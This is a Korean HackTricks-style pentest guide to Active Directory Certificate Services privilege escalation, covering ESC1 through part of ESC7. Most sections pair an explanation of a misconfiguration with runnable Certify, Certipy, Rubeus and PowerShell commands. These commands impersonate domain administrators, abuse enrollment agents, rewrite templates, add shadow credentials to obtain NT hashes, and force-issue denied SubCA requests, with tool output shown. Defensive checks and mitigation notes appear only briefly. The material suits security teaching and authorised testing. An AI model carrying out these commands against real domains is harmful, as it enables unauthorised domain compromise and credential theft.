# AD CS 도메인 권한 상승

{{#include ../../../banners/hacktricks-training.md}}


**다음 게시물의 권한 상승 기법 섹션을 요약한 내용입니다:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 잘못 구성된 Certificate Template - ESC1

### 설명

### 잘못 구성된 Certificate Template - ESC1 설명

- **Enterprise CA가 권한이 낮은 사용자에게 등록 권한을 부여합니다.**
- **관리자 승인이 필요하지 않습니다.**
- **승인된 담당자의 서명이 필요하지 않습니다.**
- **Certificate Template의 보안 설명자가 지나치게 허용적이어서 권한이 낮은 사용자도 등록 권한을 얻을 수 있습니다.**
- **Certificate Template이 인증을 가능하게 하는 EKU를 정의하도록 구성되어 있습니다:**
  - Client Authentication(OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication(1.3.6.1.5.2.3.4), Smart Card Logon(OID 1.3.6.1.4.1.311.20.2.2), Any Purpose(OID 2.5.29.37.0) 등의 Extended Key Usage(EKU) 식별자 또는 EKU 없음(SubCA)이 포함됩니다.
- **요청자가 Certificate Signing Request(CSR)에 subjectAltName을 포함할 수 있도록 Template이 허용합니다:**
  - Active Directory(AD)는 인증서에 subjectAltName(SAN)이 있으면 신원 확인 시 이를 우선합니다. 즉, CSR에 SAN을 지정하면 모든 사용자(예: 도메인 관리자)를 가장하는 인증서를 요청할 수 있습니다. 요청자가 SAN을 지정할 수 있는지는 Certificate Template의 AD 객체에 있는 `mspki-certificate-name-flag` 속성으로 확인할 수 있습니다. 이 속성은 비트마스크이며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 있으면 요청자가 SAN을 지정할 수 있습니다.

> [!CAUTION]
> 이러한 설정은 ESC1 Template 후보를 식별할 뿐, 가장 경로가 완성되었음을 뜻하지 않습니다. 대상 principal이 해당 Template을 게시하는 CA에 등록할 수 있는지, CA 등록이 허용되는지, 발급된 인증서가 인증 endpoint의 강력한 SID 매핑 규칙을 충족하는지 확인하세요. 현재 패치된 KDC는 인증서의 SID가 대상과 일치하지 않으면 요청된 UPN을 거부할 수 있습니다. 자세한 내용은 [Microsoft의 인증서 매핑 지침](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)을 참조하세요.

**Domain Computers**에 등록 권한이 부여된 경우, 원래 사용자는 등록할 수 없더라도 준비된 컴퓨터 ID는 등록 대상이 될 수 있습니다. 컴퓨터 principal의 권한은 별도로 확인하세요. 요청하기 전에 `msPKI-Minimal-Key-Size`를 확인하세요. 4096비트 RSA 키를 요구하는 Template은 클라이언트의 기본값인 2048비트 키를 거부합니다. 요청에 대상 SID를 지정하면 SID 불일치 문제를 해결할 수 있지만, 이는 CA와 KDC가 결과 인증서와 매핑을 허용하는 경우에만 가능합니다. Template 플래그나 Enroll ACE만으로는 이를 입증할 수 없습니다.

이 기능은 제품이나 배포 서비스에서 HTTPS 또는 호스트 인증서를 즉석에서 생성하도록 지원하거나, 관련 설정에 대한 이해가 부족한 경우 활성화되기도 합니다.

이 옵션을 사용해 인증서를 만들면 경고가 표시됩니다. 반면 기존 Certificate Template(예: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`가 활성화된 `WebServer` Template)을 복제한 후 인증 OID를 추가하도록 수정하면 경고가 표시되지 않습니다.<sup>[[6]](#references)</sup>

### 악용

**취약한 Certificate Template을 찾으려면** 다음 명령을 실행할 수 있습니다:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

**관리자를 사칭하기 위해 이 취약점을 악용하려면** 다음을 실행할 수 있습니다:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

그런 다음 생성된 **인증서를 `.pfx`** 형식으로 변환하고, 이를 사용해 **Rubeus 또는 certipy로 다시 인증**할 수 있습니다:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windows 바이너리인 "Certreq.exe" 및 "Certutil.exe"를 사용해 PFX를 생성할 수 있습니다: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

승인이나 서명이 필요하지 않고, Client Authentication 또는 Smart Card Logon EKU를 보유하며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 활성화된 인증서 템플릿을 AD Forest의 구성 스키마에서 열거하려면 다음 LDAP 쿼리를 실행하면 됩니다:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## 잘못 구성된 인증서 템플릿 - ESC2

### 설명

두 번째 악용 시나리오는 첫 번째 시나리오의 변형입니다.

1. Enterprise CA가 권한이 낮은 사용자에게 등록 권한을 부여합니다.
2. 관리자 승인 요구 사항이 비활성화되어 있습니다.
3. 권한 있는 서명 요구 사항이 생략되어 있습니다.
4. 인증서 템플릿의 지나치게 허용적인 보안 설명자가 권한이 낮은 사용자에게 인증서 등록 권한을 부여합니다.
5. **인증서 템플릿에 Any Purpose EKU가 포함되도록 정의되어 있거나 EKU가 없습니다.**

**Any Purpose EKU**를 사용하면 공격자가 클라이언트 인증, 서버 인증, 코드 서명 등 **모든 목적**으로 인증서를 발급받을 수 있습니다. **ESC3에 사용된 것과 동일한 technique**을 이 시나리오의 악용에 사용할 수 있습니다.

하위 CA 인증서로 작동하는 **EKU가 없는** 인증서는 **모든 목적**으로 악용할 수 있으며, **새 인증서에 서명하는 데도 사용할 수 있습니다**. 따라서 공격자는 하위 CA 인증서를 이용해 새 인증서에 임의의 EKU나 필드를 지정할 수 있습니다.

하지만 하위 CA가 **`NTAuthCertificates`** 개체에서 신뢰되지 않는 경우(기본 설정), **도메인 인증**용으로 생성된 새 인증서는 작동하지 않습니다. 그럼에도 공격자는 **임의의 EKU**와 임의의 인증서 값을 가진 **새 인증서를 생성**할 수 있습니다. 이러한 인증서는 다양한 목적으로 악용될 수 있으며(예: 코드 서명, 서버 인증 등), SAML, AD FS 또는 IPSec 같은 네트워크 내 다른 애플리케이션에도 중대한 영향을 미칠 수 있습니다.<sup>[[6]](#references)</sup>

AD Forest의 구성 스키마에서 이 시나리오에 해당하는 템플릿을 열거하려면 다음 LDAP 쿼리를 실행할 수 있습니다:

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## 잘못 구성된 Enrolment Agent 템플릿 - ESC3

### 설명

이 시나리오는 첫 번째 및 두 번째 시나리오와 비슷하지만 **다른 EKU**(Certificate Request Agent)와 **서로 다른 2개의 템플릿**을 **악용**합니다(따라서 요구 사항도 2세트입니다).

**Certificate Request Agent EKU**(OID 1.3.6.1.4.1.311.20.2.1)는 Microsoft 문서에서 **Enrollment Agent**라고 하며, 주체가 다른 사용자를 **대신하여** **인증서**를 **등록**할 수 있게 합니다.

**“enrollment agent”**는 이러한 **템플릿**에 등록한 다음, 발급받은 **인증서를 사용해 다른 사용자를 대신하여 CSR에 공동 서명**합니다. 그런 다음 **공동 서명된 CSR**을 CA에 **보내고**, **“enroll on behalf of”**를 **허용하는** **템플릿**에 등록합니다. 그러면 CA는 **“다른” 사용자에게 속하는 인증서**를 발급합니다.<sup>[[6]](#references)</sup>

**요구 사항 1:**

- Enterprise CA가 낮은 권한의 사용자에게 등록 권한을 부여합니다.
- 관리자 승인 요구 사항이 없습니다.
- 승인된 서명 요구 사항이 없습니다.
- 인증서 템플릿의 보안 설명자가 지나치게 허용적이며, 낮은 권한의 사용자에게 등록 권한을 부여합니다.
- 인증서 템플릿에 Certificate Request Agent EKU가 포함되어 있어, 다른 주체를 대신하여 다른 인증서 템플릿을 요청할 수 있습니다.

**요구 사항 2:**

- Enterprise CA가 낮은 권한의 사용자에게 등록 권한을 부여합니다.
- 관리자 승인이 우회됩니다.
- 버전 1 대상 템플릿은 최신의 세분화된 발급 정책 제어가 없어도 enrollment agent를 허용할 수 있습니다. 버전 2 이상에서는 버전만으로 템플릿을 제외하지 말고, 애플리케이션 정책 발급 요구 사항과 승인된 서명을 확인합니다.
- 인증서 템플릿에 정의된 EKU가 도메인 인증을 허용합니다.
- CA에서 enrollment agent 제한을 적용하지 않습니다.

대상 템플릿은 선택한 CA에서 게시되어 있어야 하고, 대상 계정의 등록을 허용해야 하며, 의도한 도메인 인증 용도를 지원해야 합니다. 해당 계정에 필요한 subject/SAN 속성을 확인하세요. 예를 들어, AD에서 subject email을 가져오는 템플릿은 필요한 `mail` 값이 없는 계정에 인증서를 발급할 수 없습니다. Agent 인증서만으로는 이러한 대상 템플릿 조건을 충족하지 않습니다.

### 악용

[**Certify**](https://github.com/GhostPack/Certify) 또는 [**Certipy**](https://github.com/ly4k/Certipy)를 사용해 이 시나리오를 악용할 수 있습니다:<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**등록 에이전트 인증서**를 **발급받을** 수 있는 **사용자**, 등록 **에이전트**가 등록할 수 있는 템플릿, 등록 에이전트가 대신 동작할 수 있는 **계정**은 엔터프라이즈 CA에서 제한할 수 있습니다. 이를 위해 `certsrc.msc` **스냅인**을 열고, **CA를 마우스 오른쪽 버튼으로 클릭한 다음**, **속성**을 클릭하고 “등록 에이전트” 탭으로 **이동**합니다.

하지만 CA의 **기본** 설정은 “**등록 에이전트 제한 안 함**”인 것으로 알려져 있습니다. 관리자가 등록 에이전트 제한을 활성화하고 “등록 에이전트 제한”으로 설정하더라도 기본 구성은 여전히 매우 관대합니다. **Everyone**이 모든 템플릿에 누구든지인 것처럼 등록할 수 있도록 허용합니다.

### Certi-Bhai를 사용한 Windows 전용 PowerShell PoC

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai)는 Certify나 Certipy 없이 ESC1 및 ESC2/ESC3을 실행합니다. 스크립트는 `X509Enrollment` COM API로 내보낼 수 있는 2048비트 RSA 키를 만들고, PKCS#10 요청을 구성하며, LDAP를 통해 첫 번째 `pKIEnrollmentService`를 검색하고, `CertificateAuthority.Request`로 요청을 제출한 다음, 응답을 `Cert:\CurrentUser\My`에 설치하고 Base64로 인코딩된 PFX를 내보냅니다. ESC1 스크립트는 공격자가 선택한 UPN SAN(`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`, 값 `0xb`)을 추가하는 반면, ESC2/ESC3 스크립트는 첫 번째 인증서를 사용해 대리 요청용 PKCS#7에 서명합니다.<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

스크립트는 Rubeus에서 바로 사용할 수 있도록 개인 키가 포함된 **PFX**의 Base64를 출력합니다. `[Convert]::ToBase64String($cert.RawData)`로 대체하지 마세요. `RawData`는 공개 인증서만 인코딩하므로 PKINIT 요청에 서명할 수 없습니다.<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## 취약한 인증서 템플릿 액세스 제어 - ESC4

### **설명**

**인증서 템플릿**의 **보안 설명자**는 특정 **AD principal**이 템플릿에 대해 보유한 **권한**을 정의합니다.

**공격자**가 **템플릿**을 **변경**하고 **이전 섹션**에서 설명한 **악용 가능한 잘못된 구성**을 적용하는 데 필요한 **권한**을 보유한 경우, 권한 상승이 가능해질 수 있습니다.

인증서 템플릿에 적용되는 주요 권한은 다음과 같습니다:<sup>[[6]](#references)</sup>

- **Owner:** 객체를 암묵적으로 제어할 수 있으며, 모든 속성을 수정할 수 있습니다.
- **FullControl:** 모든 속성을 변경할 수 있는 기능을 포함해 객체에 대한 완전한 권한을 부여합니다.
- **WriteOwner:** 객체의 소유자를 공격자가 제어하는 principal로 변경할 수 있습니다.
- **WriteDacl:** 액세스 제어를 조정할 수 있으며, 이를 통해 공격자에게 FullControl을 부여할 수도 있습니다.
- **WriteProperty:** 객체 속성을 편집할 수 있습니다.

`CN=Certificate Templates,CN=Public Key Services,CN=Services,...` 컨테이너의 DACL도 검토하세요. [`pKICertificateTemplate` 클래스](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c)에 적용되는 `CreateChild` ACE 또는 광범위한 전체 제어 권한이 있다면 새 템플릿 객체를 생성할 수 있는 후보가 됩니다. [Microsoft 문서](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44)에 따르면 이 컨테이너에는 이러한 템플릿 객체가 저장됩니다. 생성을 시도하기 전에 일치하는 deny ACE와 상속 설정을 검토해 실제로 생성이 가능한지 확인하세요. 템플릿을 생성하는 것만으로는 인증서가 발급되지 않습니다. CA가 해당 템플릿을 게시해야 하고, 요청 principal에 등록 권한이 있어야 하며, 인증 엔드포인트에서 인증서가 의도한 ID로 매핑되어야 합니다.

### 악용

템플릿 및 기타 PKI 객체에 대한 편집 권한이 있는 principal을 식별하려면 Certify로 열거합니다:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

이전과 유사한 privesc 예시입니다.

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4는 사용자가 certificate template에 대한 write 권한을 가진 경우입니다. 예를 들어 certificate template의 설정을 덮어써서 ESC1에 취약하도록 만드는 데 악용할 수 있습니다.

Enrollee가 subject를 지정할 수 있지만 Server Authentication 용도로만 설정된 template은 그 자체로 사용자 로그온용 template이 아닙니다. Template을 제어할 실질적인 권한이 있다면, 공격자는 certificate를 요청하기 전에 인증 EKU 또는 application policy를 변경할 수 있습니다. [Microsoft 문서에서는 Smartcard Logon EKU의 로그인 용도를 설명합니다](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts). CA가 수정된 template을 게시하는지, 요청자에게 enroll 권한이 있는지, 승인 및 서명 요건을 충족하는지, 발급된 certificate가 의도한 계정에 매핑되는지 확인하세요. 특히 [Full Enforcement가 적용된 패치된 domain controller](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)는 강력한 매핑이 없는 certificate를 거부합니다. 요청에 대상 UPN을 추가해도 이 요건을 우회할 수 없습니다.

위 경로에서 볼 수 있듯이 이러한 권한은 `JOHNPC`만 가지고 있지만, 사용자 `JOHN`에게는 `JOHNPC`에 대한 새로운 `AddKeyCredentialLink` edge가 있습니다. 이 기법은 certificate와 관련되어 있으므로, 저는 이 공격도 구현했습니다. 이 공격은 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)로 알려져 있습니다.<sup>[[8]](#references)</sup> 다음은 피해자의 NT hash를 가져오는 Certipy의 `shadow auto` command를 살짝 엿보는 예시입니다.

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy**는 단일 명령으로 인증서 템플릿의 설정을 덮어쓸 수 있습니다. **기본적으로**, Certipy는 설정을 덮어써서 **ESC1에 취약하도록** 만듭니다. 또한 **`-save-old` 매개변수를 지정해 이전 설정을 저장할 수 있으며**, 이는 공격 후 설정을 **복원**할 때 유용합니다.

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## 취약한 PKI 객체 액세스 제어 - ESC5

### 설명

인증서 템플릿과 인증 기관 외에도 여러 객체를 포함하는, ACL 기반 관계의 광범위한 연결망은 전체 AD CS 시스템의 보안에 영향을 줄 수 있습니다. 보안에 큰 영향을 미칠 수 있는 객체는 다음과 같습니다.

- S4U2Self 또는 S4U2Proxy와 같은 메커니즘을 통해 손상될 수 있는 CA 서버의 AD 컴퓨터 객체.
- CA 서버의 RPC/DCOM 서버.
- 특정 컨테이너 경로 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 내의 모든 하위 AD 객체 또는 컨테이너. 이 경로에는 인증서 템플릿 컨테이너, 인증 기관 컨테이너, NTAuthCertificates 객체, 등록 서비스 컨테이너 등이 포함되며, 이에 국한되지 않습니다.

권한이 낮은 공격자가 이러한 중요 구성 요소 중 하나라도 제어하게 되면 PKI 시스템의 보안이 침해될 수 있습니다.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 설명

[**CQure Academy 게시물**](https://cqureacademy.com/blog/enhanced-key-usage)에서는 Microsoft가 설명한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그의 영향도 다룹니다. 인증 기관(CA)에서 이 설정을 활성화하면 Active Directory®에서 생성한 요청을 포함해 **모든 요청**의 **주체 대체 이름**에 **사용자 정의 값**을 포함할 수 있습니다. 따라서 도메인 **인증**용으로 설정된 **모든 템플릿**을 통해 공격자가 인증서를 등록할 수 있습니다. 여기에는 기본 User 템플릿처럼 **권한이 없는** 사용자의 등록을 허용하는 템플릿도 포함됩니다. 그 결과, 공격자는 인증서를 획득해 도메인 관리자 또는 도메인 내 **다른 활성 계정**으로 인증할 수 있습니다.<sup>[[9]](#references)</sup>

**참고**: `certreq.exe`의 `-attrib "SAN:"` 인수를 사용해 CSR(Certificate Signing Request)에 **대체 이름**을 추가하는 방식(“Name Value Pairs”라고 함)은 ESC1에서 SAN을 악용하는 방식과 **차이가 있습니다**. 여기서 차이는 **계정 정보가 포함되는 방식**에 있습니다. 확장 필드가 아니라 인증서 속성에 정보가 들어갑니다.

### 악용

조직에서는 `certutil.exe`를 사용해 다음 명령으로 설정이 활성화되어 있는지 확인할 수 있습니다:

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

이 작업은 기본적으로 **원격 레지스트리 액세스**를 사용하므로, 다음과 같은 대안도 고려할 수 있습니다:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

[**Certify**](https://github.com/GhostPack/Certify) 및 [**Certipy**](https://github.com/ly4k/Certipy) 같은 도구는 이 잘못된 구성을 탐지하고 악용할 수 있습니다:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

이러한 설정을 변경하려면 **도메인 관리자** 권한 또는 이에 준하는 권한이 있다고 가정할 때, 다음 명령을 모든 워크스테이션에서 실행할 수 있습니다:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

환경에서 이 구성을 비활성화하려면 다음과 같이 플래그를 제거할 수 있습니다:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> 2022년 5월 보안 업데이트 이후 발급되는 **certificates**에는 **요청자의 `objectSid` 속성**을 포함하는 **security extension**이 추가됩니다. ESC1의 경우 이 SID는 지정된 SAN에서 파생됩니다. 하지만 **ESC6**의 경우 SID는 SAN이 아니라 **요청자의 `objectSid`**를 반영합니다.\
> ESC6을 악용하려면 SAN보다 **새 security extension**을 우선하는 ESC10(Weak Certificate Mappings)에 시스템이 취약해야 합니다.

## 취약한 Certificate Authority 액세스 제어 - ESC7

### 공격 1

#### 설명

Certificate Authority에 대한 액세스 제어는 CA 작업을 관리하는 권한 집합으로 유지됩니다. `certsrv.msc`에 액세스하고 CA를 마우스 오른쪽 버튼으로 클릭한 다음 속성을 선택하고 보안 탭으로 이동하면 이러한 권한을 확인할 수 있습니다. 또한 다음과 같은 명령을 사용하여 PSPKI 모듈로 권한을 열거할 수 있습니다:

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

This는 “CA administrator” 및 “Certificate Manager” 역할에 각각 대응하는 주요 권한인 **`ManageCA`** 및 **`ManageCertificates`**에 대한 정보를 제공합니다.<sup>[[6]](#references)</sup>

#### 악용

인증 기관에 대한 **`ManageCA`** 권한이 있으면 PSPKI를 사용해 원격으로 설정을 조작할 수 있습니다. 여기에는 모든 템플릿에서 SAN을 지정할 수 있도록 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그를 활성화하는 작업이 포함되며, 이는 도메인 권한 상승의 핵심 요소입니다.

PSPKI의 **Enable-PolicyModuleFlag** cmdlet을 사용하면 GUI에서 직접 조작하지 않고도 설정을 변경할 수 있어 이 과정을 간소화할 수 있습니다.

**`ManageCertificates`** 권한이 있으면 보류 중인 요청을 승인할 수 있어 “CA certificate manager approval” 보호 기능을 사실상 우회할 수 있습니다.

**Certify** 및 **PSPKI** 모듈을 함께 사용해 인증서를 요청하고, 승인하고, 다운로드할 수 있습니다:

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### 설명

> [!WARNING]
> **이전 공격**에서는 **`Manage CA`** 권한을 사용해 **EDITF_ATTRIBUTESUBJECTALTNAME2** 플래그를 **활성화**하고 **ESC6 공격**을 수행했지만, CA 서비스(`CertSvc`)를 다시 시작하기 전까지는 아무런 효과가 없습니다. 사용자에게 `Manage CA` 액세스 권한이 있으면 서비스도 **다시 시작할 수 있습니다**. 하지만 그렇다고 해서 사용자가 **원격으로 서비스를 다시 시작할 수 있다는 뜻은 아닙니다**. 또한, 2022년 5월 보안 업데이트로 인해 대부분의 패치된 환경에서는 **ESC6가 기본적으로 작동하지 않을 수 있습니다**.

따라서 여기서는 다른 공격을 소개합니다.

사전 조건:

- **`ManageCA` 권한만 필요**
- **`Manage Certificates`** 권한 (**`ManageCA`**에서 부여 가능)
- 인증서 템플릿 **`SubCA`**가 **활성화되어 있어야 함** (**`ManageCA`**에서 활성화 가능)

이 기법은 `Manage CA` _및_ `Manage Certificates` 액세스 권한이 있는 사용자가 **실패한 인증서 요청을 발급할 수 있다**는 점을 이용합니다. **`SubCA`** 인증서 템플릿은 **ESC1에 취약하지만**, **관리자만** 해당 템플릿에 등록할 수 있습니다. 따라서 **사용자**는 **`SubCA`**에 등록을 **요청**할 수 있으며, 이 요청은 **거부되지만**, 이후 관리자가 발급할 수 있습니다.<sup>[[6]](#references)</sup>

#### 악용

새 officer로 사용자를 추가하여 **`Manage Certificates`** 액세스 권한을 **자신에게 부여할 수 있습니다**.

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** 템플릿은 `-enable-template` 매개변수를 사용해 **CA에서 활성화할 수 있습니다**. 기본적으로 `SubCA` 템플릿은 활성화되어 있습니다.

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

이 공격의 전제 조건을 충족했다면, **`SubCA` 템플릿을 기반으로 인증서를 요청하는 것부터 시작할 수 있습니다.**

**이 요청은 거부됩니**다. 하지만 개인 키를 저장하고 요청 ID를 기록해 둡니다.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

**`Manage CA` and `Manage Certificates`** 권한이 있으면 `ca` 명령과 `-issue-request <request ID>` 매개변수를 사용해 **실패한 인증서 요청을 발급**할 수 있습니다.

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

마지막으로, `req` 명령과 `-retrieve <request ID>` 파라미터를 사용해 **발급된 인증서를 가져올 수 있습니다**.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### 설명

기존 ESC7 악용(EDITF attributes 활성화 또는 보류 중인 요청 승인)에 더해, **Certify 2.0**은 Enterprise CA에서 *Manage Certificates*(일명 **Certificate Manager / Officer**) 역할만 있으면 사용할 수 있는 완전히 새로운 primitive를 공개했습니다.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC 메서드는 *Manage Certificates* 권한을 가진 모든 principal이 실행할 수 있습니다. 이 메서드는 전통적으로 정상적인 CA가 **보류 중인** 요청의 extension을 업데이트하는 데 사용했지만, 공격자는 이를 악용해 승인을 기다리는 요청에 **기본값이 아닌(non-default) certificate extension**(예: `1.1.1.1`과 같은 사용자 지정 *Certificate Issuance Policy* OID)을 **추가할** 수 있습니다.

대상 template에 해당 extension의 기본값이 **정의되어 있지 않으므로**, 요청이 최종 발급될 때 CA는 공격자가 제어하는 값을 덮어쓰지 않습니다. 따라서 발급된 certificate에는 공격자가 선택한 extension이 포함되며, 이를 통해 다음과 같은 결과를 얻을 수 있습니다.

* 다른 취약한 template의 Application / Issuance Policy 요구 사항을 충족해 권한 상승으로 이어질 수 있습니다.
* 추가 EKU 또는 policy를 삽입해 타사 시스템에서 certificate에 예상치 못한 신뢰를 부여할 수 있습니다.

